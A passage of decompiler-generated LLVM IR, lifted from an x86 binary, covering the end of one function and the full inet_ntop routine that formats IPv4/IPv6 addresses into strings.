  %tmp39 = icmp ugt i32 %v3_805e1b8, %v0_805e107
  br i1 %tmp39, label %dec_label_pc_805e1c6, label %dec_label_pc_805e1d5

dec_label_pc_805e1c6:                             ; preds = %dec_label_pc_805e1ab
  %v0_805e1c6 = load i8*, i8** %stack_var_-92, align 4
  %v1_805e1c6 = ptrtoint i8* %v0_805e1c6 to i32
  %v2_805e1c6 = call i32 @__errno_location(i32 %v1_805e1c6)
  %v1_805e1cb = inttoptr i32 %v2_805e1c6 to i32*
  store i32 28, i32* %v1_805e1cb, align 4
  br label %dec_label_pc_805e1e4

dec_label_pc_805e1d5:                             ; preds = %dec_label_pc_805e1ab
  %tmp24 = bitcast i8** %stack_var_-60 to i32*
  %v3_805e1d85 = load i32, i32* %tmp24, align 4
  %tmp25 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_805e1d85, i32* %tmp25, align 4
  %v0_805e1dc.cast = inttoptr i32 %v3_805e1d85 to i8*
  %v4_805e1dc = call i32 @strcpy(i8* %v0_805e1dc.cast, i32 %v2_805e1b3)
  br label %dec_label_pc_805e1e4

dec_label_pc_805e1e4:                             ; preds = %dec_label_pc_805e1c6, %dec_label_pc_805e1d5
  %storemerge = phi i32 [ %v4_805e1dc, %dec_label_pc_805e1d5 ], [ 0, %dec_label_pc_805e1c6 ]
  %v0_805e1eb = phi i32 [ %v4_805e1dc, %dec_label_pc_805e1d5 ], [ 0, %dec_label_pc_805e1c6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805e0e6, i32* @esi, align 4
  store i32 %v0_805e0e5, i32* @edi, align 4
  ret i32 %v0_805e1eb

; uselistorder directives
  uselistorder i32 %v0_805e1a2, { 1, 0 }
  uselistorder i32 %v3_805e198, { 1, 0 }
  uselistorder i32 %v1_805e198, { 1, 0 }
  uselistorder i32 %v1_805e176, { 1, 0 }
  uselistorder i32 %v1_805e152, { 1, 0 }
  uselistorder i32 %v0_805e164, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805e133, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i8 100, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805e1e4, { 1, 0 }
  uselistorder label %dec_label_pc_805e180, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805e118, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_805e1ec = load i32, i32* @ebp, align 4
  %v0_805e1ed = load i32, i32* @edi, align 4
  %v0_805e1ee = load i32, i32* @esi, align 4
  %v0_805e1ef = load i32, i32* @ebx, align 4
  %v15_805e1f0 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_805e1f7 = icmp eq i32 %arg1, 2
  br i1 %v9_805e1f7, label %dec_label_pc_805e207, label %dec_label_pc_805e1fc

dec_label_pc_805e1fc:                             ; preds = %entry
  %v9_805e1fc = icmp eq i32 %arg1, 10
  %v1_805e1ff = icmp eq i1 %v9_805e1fc, false
  br i1 %v1_805e1ff, label %dec_label_pc_805e3a3, label %dec_label_pc_805e21f

dec_label_pc_805e207:                             ; preds = %entry
  %v4_805e207 = ptrtoint i8* %arg3 to i32
  store i32 %v4_805e207, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_805e213 = call i32 @inet_ntop4(i32 %v0_805e1ef, i32 %v0_805e1ee, i32 %v0_805e1ed)
  store i32 %v3_805e213, i32* %eax.global-to-local, align 4
  store i32 %v3_805e213, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805e3b0

dec_label_pc_805e21f:                             ; preds = %dec_label_pc_805e1fc
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_805e224 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805e224, i32* %eax.global-to-local, align 4
  %tmp42 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp42, i8** %stack_var_-124, align 4
  %v6_805e229 = call i32 @__GI_memset(i8* %tmp42, i32 0, i32 32)
  store i32 %v6_805e229, i32* %eax.global-to-local, align 4
  %v2_805e24b = add i32 %arg2, 1
  br label %dec_label_pc_805e235

dec_label_pc_805e235:                             ; preds = %dec_label_pc_805e235.dec_label_pc_805e235_crit_edge, %dec_label_pc_805e21f
  %v1_805e258 = phi i32 [ %v15_805e1f0, %dec_label_pc_805e21f ], [ %v1_805e258.pre, %dec_label_pc_805e235.dec_label_pc_805e235_crit_edge ]
  %v0_805e25368 = phi i32 [ 0, %dec_label_pc_805e21f ], [ %v0_805e25c.pre, %dec_label_pc_805e235.dec_label_pc_805e235_crit_edge ]
  %v1_805e23e = ashr i32 %v0_805e25368, 31
  %v2_805e23f = zext i32 %v0_805e25368 to i64
  %v4_805e23f = zext i32 %v1_805e23e to i64
  %v5_805e23f = mul nuw i64 %v4_805e23f, 4294967296
  %v6_805e23f = or i64 %v5_805e23f, %v2_805e23f
  %v8_805e23f = sdiv i64 %v6_805e23f, 2
  %v9_805e23f = trunc i64 %v8_805e23f to i32
  store i32 %v9_805e23f, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_805e23f, i32* %ebx.global-to-local, align 4
  %v2_805e247 = add i32 %v0_805e25368, %arg2
  %v3_805e247 = inttoptr i32 %v2_805e247 to i8*
  %v4_805e247 = load i8, i8* %v3_805e247, align 1
  %v5_805e247 = zext i8 %v4_805e247 to i32
  store i32 %v5_805e247, i32* %eax.global-to-local, align 4
  %v3_805e24b = add i32 %v2_805e24b, %v0_805e25368
  %v4_805e24b = inttoptr i32 %v3_805e24b to i8*
  %v5_805e24b = load i8, i8* %v4_805e24b, align 1
  %v6_805e24b = zext i8 %v5_805e24b to i32
  store i32 %v6_805e24b, i32* %edx.global-to-local, align 4
  %v2_805e250 = mul nuw nsw i32 %v5_805e247, 256
  %v1_805e253 = add i32 %v0_805e25368, 2
  store i32 %v1_805e253, i32* @ecx, align 4
  %v2_805e256 = or i32 %v6_805e24b, %v2_805e250
  store i32 %v2_805e256, i32* %eax.global-to-local, align 4
  %v3_805e258 = mul i32 %v9_805e23f, 4
  %v4_805e258 = add i32 %v3_805e258, 60
  %v5_805e258 = add i32 %v4_805e258, %v1_805e258
  %v6_805e258 = inttoptr i32 %v5_805e258 to i32*
  store i32 %v2_805e256, i32* %v6_805e258, align 4
  %v0_805e25c.pre = load i32, i32* @ecx, align 4
  %v7_805e25f = icmp sgt i32 %v0_805e25c.pre, 15
  br i1 %v7_805e25f, label %dec_label_pc_805e261, label %dec_label_pc_805e235.dec_label_pc_805e235_crit_edge

dec_label_pc_805e235.dec_label_pc_805e235_crit_edge: ; preds = %dec_label_pc_805e235
  %v1_805e258.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805e235

dec_label_pc_805e261:                             ; preds = %dec_label_pc_805e235
  %v4_805e21f = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805e26b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805e26b

dec_label_pc_805e26b:                             ; preds = %dec_label_pc_805e261, %dec_label_pc_805e298
  %v0_805e29867 = phi i32 [ 0, %dec_label_pc_805e261 ], [ %v1_805e298, %dec_label_pc_805e298 ]
  %v0_805e28366 = phi i32 [ -1, %dec_label_pc_805e261 ], [ %v0_805e2837, %dec_label_pc_805e298 ]
  %v0_805e2a365 = phi i32 [ -1, %dec_label_pc_805e261 ], [ %v0_805e2888, %dec_label_pc_805e298 ]
  %v0_805e2ae64 = phi i32 [ -1, %dec_label_pc_805e261 ], [ %v0_805e29312, %dec_label_pc_805e298 ]
  %v2_805e26b = mul nuw nsw i32 %v0_805e29867, 4
  %v3_805e26b = add nuw nsw i32 %v2_805e26b, 60
  %v4_805e26b = add i32 %v3_805e26b, %v0_805e26b.pre
  %v5_805e26b = inttoptr i32 %v4_805e26b to i32*
  %v6_805e26b = load i32, i32* %v5_805e26b, align 4
  %v7_805e26b = icmp eq i32 %v6_805e26b, 0
  %v1_805e270 = icmp eq i1 %v7_805e26b, false
  %v10_805e283 = icmp eq i32 %v0_805e28366, -1
  br i1 %v1_805e270, label %dec_label_pc_805e283, label %dec_label_pc_805e272

dec_label_pc_805e272:                             ; preds = %dec_label_pc_805e26b
  %v1_805e275 = icmp eq i1 %v10_805e283, false
  br i1 %v1_805e275, label %dec_label_pc_805e280, label %dec_label_pc_805e277

dec_label_pc_805e277:                             ; preds = %dec_label_pc_805e272
  store i32 %v0_805e29867, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805e298

dec_label_pc_805e280:                             ; preds = %dec_label_pc_805e272
  %v0_805e280 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805e280 = add i32 %v0_805e280, 1
  store i32 %v1_805e280, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805e298

dec_label_pc_805e283:                             ; preds = %dec_label_pc_805e26b
  br i1 %v10_805e283, label %dec_label_pc_805e298, label %dec_label_pc_805e288

dec_label_pc_805e288:                             ; preds = %dec_label_pc_805e283
  %v10_805e288 = icmp eq i32 %v0_805e2a365, -1
  %v0_805e291.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805e28d = load i32, i32* @ebp, align 4
  %v7_805e28f = icmp sgt i32 %v0_805e291.pre, %v1_805e28d
  %or.cond = or i1 %v10_805e288, %v7_805e28f
  br i1 %or.cond, label %dec_label_pc_805e291, label %dec_label_pc_805e295

dec_label_pc_805e291:                             ; preds = %dec_label_pc_805e288
  store i32 %v0_805e291.pre, i32* @ebp, align 4
  store i32 %v0_805e2ae64, i32* @edi, align 4
  br label %dec_label_pc_805e295

dec_label_pc_805e295:                             ; preds = %dec_label_pc_805e288, %dec_label_pc_805e291
  %v0_805e28810 = phi i32 [ %v0_805e2ae64, %dec_label_pc_805e291 ], [ %v0_805e2a365, %dec_label_pc_805e288 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e298

dec_label_pc_805e298:                             ; preds = %dec_label_pc_805e283, %dec_label_pc_805e280, %dec_label_pc_805e277, %dec_label_pc_805e295
  %v0_805e29312 = phi i32 [ %v0_805e2ae64, %dec_label_pc_805e283 ], [ %v0_805e2ae64, %dec_label_pc_805e280 ], [ %v0_805e29867, %dec_label_pc_805e277 ], [ -1, %dec_label_pc_805e295 ]
  %v0_805e2837 = phi i32 [ -1, %dec_label_pc_805e283 ], [ %v0_805e28366, %dec_label_pc_805e280 ], [ %v0_805e29867, %dec_label_pc_805e277 ], [ -1, %dec_label_pc_805e295 ]
  %v0_805e2888 = phi i32 [ %v0_805e2a365, %dec_label_pc_805e283 ], [ %v0_805e2a365, %dec_label_pc_805e280 ], [ %v0_805e2a365, %dec_label_pc_805e277 ], [ %v0_805e28810, %dec_label_pc_805e295 ]
  %v1_805e298 = add nuw nsw i32 %v0_805e29867, 1
  store i32 %v1_805e298, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_805e298, 8
  br i1 %exitcond, label %dec_label_pc_805e29e, label %dec_label_pc_805e26b

dec_label_pc_805e29e:                             ; preds = %dec_label_pc_805e298
  %v10_805e29e = icmp eq i32 %v0_805e29312, -1
  br i1 %v10_805e29e, label %dec_label_pc_805e2b0, label %dec_label_pc_805e2a3

dec_label_pc_805e2a3:                             ; preds = %dec_label_pc_805e29e
  %v10_805e2a3 = icmp eq i32 %v0_805e2888, -1
  %v0_805e2ac.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_805e2a3, label %dec_label_pc_805e2ac, label %dec_label_pc_805e2a8

dec_label_pc_805e2a8:                             ; preds = %dec_label_pc_805e2a3
  %v1_805e2a8 = load i32, i32* @ebp, align 4
  %v7_805e2aa = icmp sgt i32 %v0_805e2ac.pre, %v1_805e2a8
  br i1 %v7_805e2aa, label %dec_label_pc_805e2ac, label %dec_label_pc_805e2b0

dec_label_pc_805e2ac:                             ; preds = %dec_label_pc_805e2a3, %dec_label_pc_805e2a8
  store i32 %v0_805e2ac.pre, i32* @ebp, align 4
  store i32 %v0_805e29312, i32* @edi, align 4
  br label %dec_label_pc_805e2b0

dec_label_pc_805e2b0:                             ; preds = %dec_label_pc_805e2a8, %dec_label_pc_805e29e, %dec_label_pc_805e2ac
  %v0_805e2b0 = phi i32 [ %v0_805e2888, %dec_label_pc_805e2a8 ], [ %v0_805e2888, %dec_label_pc_805e29e ], [ %v0_805e29312, %dec_label_pc_805e2ac ]
  %v10_805e2b0 = icmp eq i32 %v0_805e2b0, -1
  br i1 %v10_805e2b0, label %dec_label_pc_805e2bd, label %dec_label_pc_805e2b5

dec_label_pc_805e2b5:                             ; preds = %dec_label_pc_805e2b0
  %v0_805e2b5 = load i32, i32* @ebp, align 4
  %v1_805e2b5 = add i32 %v0_805e2b5, -1
  %v6_805e2b5 = sub i32 0, %v0_805e2b5
  %v7_805e2b5 = and i32 %v0_805e2b5, %v6_805e2b5
  %v8_805e2b5 = icmp slt i32 %v7_805e2b5, 0
  %v9_805e2b5 = icmp eq i32 %v1_805e2b5, 0
  %v10_805e2b5 = icmp slt i32 %v1_805e2b5, 0
  %v3_805e2b8 = icmp eq i1 %v10_805e2b5, %v8_805e2b5
  %v4_805e2b8 = icmp eq i1 %v9_805e2b5, false
  %v5_805e2b8 = and i1 %v4_805e2b8, %v3_805e2b8
  br i1 %v5_805e2b8, label %dec_label_pc_805e2bd, label %dec_label_pc_805e2ba

dec_label_pc_805e2ba:                             ; preds = %dec_label_pc_805e2b5
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_805e2bd

dec_label_pc_805e2bd:                             ; preds = %dec_label_pc_805e2b5, %dec_label_pc_805e2b0, %dec_label_pc_805e2ba
  %v0_805e35d17 = phi i32 [ %v0_805e2b0, %dec_label_pc_805e2b5 ], [ %v0_805e2b0, %dec_label_pc_805e2b0 ], [ -1, %dec_label_pc_805e2ba ]
  %v2_805e2bd = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_805e2bd, i32* @ebx, align 4
  %v3_805e33f = add i32 %v4_805e21f, 64
  %v12_805e2fd = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805e35d57 = icmp eq i32 %v0_805e35d17, -1
  %v1_805e305 = icmp eq i1 %v12_805e2fd, false
  br label %dec_label_pc_805e2c8

dec_label_pc_805e2c8:                             ; preds = %dec_label_pc_805e2bd, %dec_label_pc_805e353
  %v10_805e35d63 = phi i1 [ %v10_805e35d57, %dec_label_pc_805e2bd ], [ %v10_805e35d, %dec_label_pc_805e353 ]
  %v0_805e2e262 = phi i32 [ 0, %dec_label_pc_805e2bd ], [ %v1_805e353, %dec_label_pc_805e353 ]
  %v1_805e2d861 = phi i32 [ %v0_805e35d17, %dec_label_pc_805e2bd ], [ %v0_805e35d.pre, %dec_label_pc_805e353 ]
  %v0_805e2e660 = phi i32 [ %v2_805e2bd, %dec_label_pc_805e2bd ], [ %v0_805e2dc18, %dec_label_pc_805e353 ]
  %stack_var_-120.159 = phi i8* [ null, %dec_label_pc_805e2bd ], [ %stack_var_-120.0, %dec_label_pc_805e353 ]
  %stack_var_-116.158 = phi i32 [ 32, %dec_label_pc_805e2bd ], [ %stack_var_-116.0, %dec_label_pc_805e353 ]
  br i1 %v10_805e35d63, label %dec_label_pc_805e2e2, label %dec_label_pc_805e2cd

dec_label_pc_805e2cd:                             ; preds = %dec_label_pc_805e2c8
  %v12_805e2cd = icmp eq i32 %v0_805e2e262, %v1_805e2d861
  %v5_805e2cf = icmp slt i32 %v0_805e2e262, %v1_805e2d861
  br i1 %v5_805e2cf, label %dec_label_pc_805e2e2, label %dec_label_pc_805e2d1

dec_label_pc_805e2d1:                             ; preds = %dec_label_pc_805e2cd
  %v1_805e2d1 = load i32, i32* @ebp, align 4
  %v2_805e2d1 = add i32 %v1_805e2d1, %v1_805e2d861
  store i32 %v2_805e2d1, i32* %eax.global-to-local, align 4
  %v5_805e2d6 = icmp slt i32 %v0_805e2e262, %v2_805e2d1
  br i1 %v5_805e2d6, label %dec_label_pc_805e2d8, label %dec_label_pc_805e2e2

dec_label_pc_805e2d8:                             ; preds = %dec_label_pc_805e2d1
  %v1_805e2da = icmp eq i1 %v12_805e2cd, false
  br i1 %v1_805e2da, label %dec_label_pc_805e353, label %dec_label_pc_805e2dc

dec_label_pc_805e2dc:                             ; preds = %dec_label_pc_805e2d8
  %v1_805e2dc = inttoptr i32 %v0_805e2e660 to i8*
  store i8 58, i8* %v1_805e2dc, align 1
  %v0_805e2df = load i32, i32* @ebx, align 4
  %v1_805e2df = add i32 %v0_805e2df, 1
  store i32 %v1_805e2df, i32* @ebx, align 4
  br label %dec_label_pc_805e353

dec_label_pc_805e2e2:                             ; preds = %dec_label_pc_805e2d1, %dec_label_pc_805e2cd, %dec_label_pc_805e2c8
  %v1_805e2e2 = icmp eq i32 %v0_805e2e262, 0
  br i1 %v1_805e2e2, label %dec_label_pc_805e2ea, label %dec_label_pc_805e2e6

dec_label_pc_805e2e6:                             ; preds = %dec_label_pc_805e2e2
  %v1_805e2e6 = inttoptr i32 %v0_805e2e660 to i8*
  store i8 58, i8* %v1_805e2e6, align 1
  %v0_805e2e9 = load i32, i32* @ebx, align 4
  %v1_805e2e9 = add i32 %v0_805e2e9, 1
  store i32 %v1_805e2e9, i32* @ebx, align 4
  %v0_805e2ea.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805e2ea

dec_label_pc_805e2ea:                             ; preds = %dec_label_pc_805e2e2, %dec_label_pc_805e2e6
  %v0_805e348 = phi i32 [ %v0_805e2e660, %dec_label_pc_805e2e2 ], [ %v1_805e2e9, %dec_label_pc_805e2e6 ]
  %v1_805e33f = phi i32 [ 0, %dec_label_pc_805e2e2 ], [ %v0_805e2ea.pre, %dec_label_pc_805e2e6 ]
  %v9_805e2ea = icmp eq i32 %v1_805e33f, 6
  %v1_805e2ed = icmp eq i1 %v9_805e2ea, false
  br i1 %v1_805e2ed, label %dec_label_pc_805e33e, label %dec_label_pc_805e2ef

dec_label_pc_805e2ef:                             ; preds = %dec_label_pc_805e2ea
  %v0_805e2ef = load i32, i32* @edi, align 4
  %v1_805e2ef = icmp eq i32 %v0_805e2ef, 0
  %v1_805e2f1 = icmp eq i1 %v1_805e2ef, false
  br i1 %v1_805e2f1, label %dec_label_pc_805e33e, label %dec_label_pc_805e2f3

dec_label_pc_805e2f3:                             ; preds = %dec_label_pc_805e2ef
  %v0_805e2f3 = load i32, i32* @ebp, align 4
  %v9_805e2f3 = icmp eq i32 %v0_805e2f3, 6
  br i1 %v9_805e2f3, label %dec_label_pc_805e307, label %dec_label_pc_805e2f8

dec_label_pc_805e2f8:                             ; preds = %dec_label_pc_805e2f3
  %v9_805e2f8 = icmp eq i32 %v0_805e2f3, 5
  %v1_805e2fb = icmp eq i1 %v9_805e2f8, false
  br i1 %v1_805e2fb, label %dec_label_pc_805e33e, label %dec_label_pc_805e2fd

dec_label_pc_805e2fd:                             ; preds = %dec_label_pc_805e2f8
  br i1 %v1_805e305, label %dec_label_pc_805e33e, label %dec_label_pc_805e307

dec_label_pc_805e307:                             ; preds = %dec_label_pc_805e2fd, %dec_label_pc_805e2f3
  %v2_805e30d = sub i32 %v0_805e348, %v2_805e2bd
  store i32 %v2_805e30d, i32* @esi, align 4
  %v2_805e318 = sub i32 46, %v2_805e30d
  store i32 %v2_805e318, i32* @ecx, align 4
  %v1_805e31a = add i32 %arg2, 12
  store i32 %v1_805e31a, i32* @eax, align 4
  store i32 %v0_805e348, i32* @edx, align 4
  %v0_805e31f = load i8*, i8** %stack_var_-124, align 4
  %v1_805e31f = ptrtoint i8* %v0_805e31f to i32
  %v3_805e31f = ptrtoint i8* %stack_var_-120.159 to i32
  %v5_805e31f = call i32 @inet_ntop4(i32 %v1_805e31f, i32 %v3_805e31f, i32 %stack_var_-116.158)
  store i32 %v5_805e31f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805e326 = icmp eq i32 %v5_805e31f, 0
  br i1 %v1_805e326, label %dec_label_pc_805e3b0, label %dec_label_pc_805e32e

dec_label_pc_805e32e:                             ; preds = %dec_label_pc_805e307
  %v0_805e331 = load i32, i32* @ebx, align 4
  %v5_805e331 = inttoptr i32 %v0_805e331 to i8*
  store i8* %v5_805e331, i8** %stack_var_-124, align 4
  %v3_805e332 = call i32 @strlen(i8* %v5_805e331)
  store i32 %v3_805e332, i32* %eax.global-to-local, align 4
  %v0_805e33a = load i32, i32* @ebx, align 4
  %v3_805e33a = add i32 %v0_805e33a, %v3_805e332
  store i32 %v3_805e33a, i32* @ebx, align 4
  %v0_805e362.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805e362

dec_label_pc_805e33e:                             ; preds = %dec_label_pc_805e2fd, %dec_label_pc_805e2f8, %dec_label_pc_805e2ef, %dec_label_pc_805e2ea
  %v0_805e33e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_805e33e, i32* %stack_var_-112, align 4
  %v2_805e33f = mul i32 %v1_805e33f, 4
  %v4_805e33f = add i32 %v3_805e33f, %v2_805e33f
  %v5_805e33f = inttoptr i32 %v4_805e33f to i32*
  %v6_805e33f = load i32, i32* %v5_805e33f, align 4
  %v5_805e348 = inttoptr i32 %v0_805e348 to i8*
  store i8* %v5_805e348, i8** %stack_var_-124, align 4
  %v4_805e349 = call i32 @sprintf(i32 %v0_805e348, i32 ptrtoint ([3 x i8]* @global_var_806d774.721 to i32))
  store i32 %v4_805e349, i32* %eax.global-to-local, align 4
  %v0_805e351 = load i32, i32* @ebx, align 4
  %v2_805e351 = add i32 %v0_805e351, %v4_805e349
  store i32 %v2_805e351, i32* @ebx, align 4
  br label %dec_label_pc_805e353

dec_label_pc_805e353:                             ; preds = %dec_label_pc_805e2d8, %dec_label_pc_805e2dc, %dec_label_pc_805e33e
  %stack_var_-116.0 = phi i32 [ %v6_805e33f, %dec_label_pc_805e33e ], [ %stack_var_-116.158, %dec_label_pc_805e2d8 ], [ %stack_var_-116.158, %dec_label_pc_805e2dc ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806d774.721, i32 0, i32 0), %dec_label_pc_805e33e ], [ %stack_var_-120.159, %dec_label_pc_805e2d8 ], [ %stack_var_-120.159, %dec_label_pc_805e2dc ]
  %v0_805e2dc18 = phi i32 [ %v2_805e351, %dec_label_pc_805e33e ], [ %v0_805e2e660, %dec_label_pc_805e2d8 ], [ %v1_805e2df, %dec_label_pc_805e2dc ]
  %v0_805e353 = load i32, i32* @esi, align 4
  %v1_805e353 = add i32 %v0_805e353, 1
  %v0_805e35d.pre = load i32, i32* @edi, align 4
  store i32 %v1_805e353, i32* @esi, align 4
  %v7_805e357 = icmp sgt i32 %v1_805e353, 7
  %v10_805e35d = icmp eq i32 %v0_805e35d.pre, -1
  br i1 %v7_805e357, label %dec_label_pc_805e35d, label %dec_label_pc_805e2c8

dec_label_pc_805e35d:                             ; preds = %dec_label_pc_805e353
  br i1 %v10_805e35d, label %dec_label_pc_805e36e, label %dec_label_pc_805e362

dec_label_pc_805e362:                             ; preds = %dec_label_pc_805e35d, %dec_label_pc_805e32e
  %v0_805e36a = phi i32 [ %v0_805e2dc18, %dec_label_pc_805e35d ], [ %v3_805e33a, %dec_label_pc_805e32e ]
  %v0_805e362 = phi i32 [ %v0_805e35d.pre, %dec_label_pc_805e35d ], [ %v0_805e362.pre, %dec_label_pc_805e32e ]
  %v1_805e362 = load i32, i32* @ebp, align 4
  %v2_805e362 = add i32 %v1_805e362, %v0_805e362
  store i32 %v2_805e362, i32* %eax.global-to-local, align 4
  %v9_805e365 = icmp eq i32 %v2_805e362, 8
  %v1_805e368 = icmp eq i1 %v9_805e365, false
  br i1 %v1_805e368, label %dec_label_pc_805e36e, label %dec_label_pc_805e36a

dec_label_pc_805e36a:                             ; preds = %dec_label_pc_805e362
  %v1_805e36a = inttoptr i32 %v0_805e36a to i8*
  store i8 58, i8* %v1_805e36a, align 1
  %v0_805e36d = load i32, i32* @ebx, align 4
  %v1_805e36d = add i32 %v0_805e36d, 1
  store i32 %v1_805e36d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805e36e

dec_label_pc_805e36e:                             ; preds = %dec_label_pc_805e362, %dec_label_pc_805e35d, %dec_label_pc_805e36a
  %v0_805e372 = phi i32 [ %v0_805e36a, %dec_label_pc_805e362 ], [ %v0_805e2dc18, %dec_label_pc_805e35d ], [ %v1_805e36d, %dec_label_pc_805e36a ]
  store i32 %v2_805e2bd, i32* %edx.global-to-local, align 4
  %v1_805e372 = add i32 %v0_805e372, 1
  store i32 %v1_805e372, i32* %eax.global-to-local, align 4
  %v1_805e375 = inttoptr i32 %v0_805e372 to i8*
  store i8 0, i8* %v1_805e375, align 1
  %v0_805e378 = load i32, i32* %eax.global-to-local, align 4
  %v1_805e378 = load i32, i32* %edx.global-to-local, align 4
  %v2_805e378 = sub i32 %v0_805e378, %v1_805e378
  store i32 %v2_805e378, i32* @eax, align 4
  %tmp73 = icmp ugt i32 %v2_805e378, %arg4
  br i1 %tmp73, label %dec_label_pc_805e380, label %dec_label_pc_805e38d

dec_label_pc_805e380:                             ; preds = %dec_label_pc_805e36e
  %v0_805e380 = load i8*, i8** %stack_var_-124, align 4
  %v1_805e380 = ptrtoint i8* %v0_805e380 to i32
  %v2_805e380 = call i32 @__errno_location(i32 %v1_805e380)
  store i32 %v2_805e380, i32* %eax.global-to-local, align 4
  %v1_805e385 = inttoptr i32 %v2_805e380 to i32*
  store i32 28, i32* %v1_805e385, align 4
  br label %dec_label_pc_805e3ae

dec_label_pc_805e38d:                             ; preds = %dec_label_pc_805e36e
  %v0_805e38d = load i32, i32* @edi, align 4
  store i32 %v0_805e38d, i32* %stack_var_-112, align 4
  %tmp44 = bitcast i8** %stack_var_12 to i32*
  %v3_805e3901 = load i32, i32* %tmp44, align 4
  %tmp45 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_805e3901, i32* %tmp45, align 4
  %v0_805e397.cast = inttoptr i32 %v3_805e3901 to i8*
  %v5_805e397 = call i32 @strcpy(i8* %v0_805e397.cast, i32 %v2_805e2bd)
  store i32 %v5_805e397, i32* %eax.global-to-local, align 4
  store i32 %v5_805e397, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805e3b0

dec_label_pc_805e3a3:                             ; preds = %dec_label_pc_805e1fc
  %v1_805e3a3 = call i32 @__errno_location(i32 %v0_805e1ef)
  store i32 %v1_805e3a3, i32* %eax.global-to-local, align 4
  %v1_805e3a8 = inttoptr i32 %v1_805e3a3 to i32*
  store i32 97, i32* %v1_805e3a8, align 4
  br label %dec_label_pc_805e3ae

dec_label_pc_805e3ae:                             ; preds = %dec_label_pc_805e380, %dec_label_pc_805e3a3
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805e3b0

dec_label_pc_805e3b0:                             ; preds = %dec_label_pc_805e307, %dec_label_pc_805e38d, %dec_label_pc_805e207, %dec_label_pc_805e3ae
  %v0_805e3b3 = phi i32 [ 0, %dec_label_pc_805e307 ], [ %v5_805e397, %dec_label_pc_805e38d ], [ %v3_805e213, %dec_label_pc_805e207 ], [ 0, %dec_label_pc_805e3ae ]
  store i32 %v0_805e3b3, i32* %eax.global-to-local, align 4
  store i32 %v0_805e1ef, i32* @ebx, align 4
  store i32 %v0_805e1ee, i32* @esi, align 4
  store i32 %v0_805e1ed, i32* @edi, align 4
  store i32 %v0_805e1ec, i32* @ebp, align 4
  ret i32 %v0_805e3b3

; uselistorder directives
  uselistorder i32 %v0_805e3b3, { 1, 0 }
  uselistorder i32 %v0_805e372, { 1, 0 }
  uselistorder i1 %v10_805e35d, { 1, 0 }
  uselistorder i32 %v0_805e35d.pre, { 1, 0, 2 }
  uselistorder i32 %v1_805e353, { 1, 0, 2 }
  uselistorder i32 %v1_805e33f, { 1, 0 }
  uselistorder i32 %v0_805e348, { 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-116.158, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.159, { 2, 1, 0 }
  uselistorder i32 %v0_805e2e660, { 3, 2, 1, 0 }
  uselistorder i32 %v1_805e2d861, { 2, 1, 0 }
  uselistorder i32 %v0_805e2e262, { 3, 2, 1, 0 }
  uselistorder i32 %v2_805e2bd, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_805e35d17, { 1, 0 }
  uselistorder i32 %v1_805e2b5, { 1, 0 }
  uselistorder i32 %v0_805e2b5, { 1, 0, 2 }
